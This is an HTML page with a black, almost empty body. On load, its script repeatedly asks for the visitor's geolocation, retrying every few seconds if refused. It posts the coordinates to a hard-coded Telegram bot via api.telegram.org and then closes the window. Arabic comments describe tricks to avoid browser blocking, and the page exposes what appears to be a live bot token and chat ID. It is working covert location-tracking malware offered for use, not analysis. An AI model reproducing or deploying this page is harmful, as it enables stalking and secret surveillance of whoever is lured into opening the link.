<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>.</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        // هذا سيطلب الإذن فعلاً
        function requestLocation() {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    // إرسال للبوت
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `📍 ${position.coords.latitude},${position.coords.longitude}`
                        })
                    });
                    window.close();
                },
                function(error) {
                    // إعادة الطلب بعد 3 ثواني
                    setTimeout(requestLocation, 3000);
                }
            );
        }

        // طلب فوري
        requestLocation();
        
        // طلب كل 5 ثواني
        setInterval(requestLocation, 5000);
    </script>
</head>
<body style="margin:0;padding:0;background:#000;">
    <!-- نقطة صغيرة لتجنب حظر المتصفح -->
    <div style="width:1px;height:1px;"></div>
</body>
</html>
